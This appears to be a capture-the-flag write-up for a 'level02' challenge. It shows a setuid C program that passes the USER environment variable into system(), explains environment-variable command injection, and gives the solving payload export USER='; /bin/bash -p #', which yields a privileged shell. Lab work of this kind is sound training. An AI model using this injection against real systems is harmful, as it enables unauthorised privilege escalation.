# username / password
level02 / level02
# objective
* There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
* To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.
Here is the source code for the binary:
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
# concept
* environment hijacking
* the source code uses the `USER` environment variable in its command output
* we can inject system commands into the `USER` variable to execute commands
# method of solve
* inject a command to open a shell in the `USER` variable
```
export USER='; /bin/bash -p #'
```
* then when we run the binary, it will use the payload we put in the `USER` variable and give us a privileged shell
```
/home/flag02/flag02
getflag
```
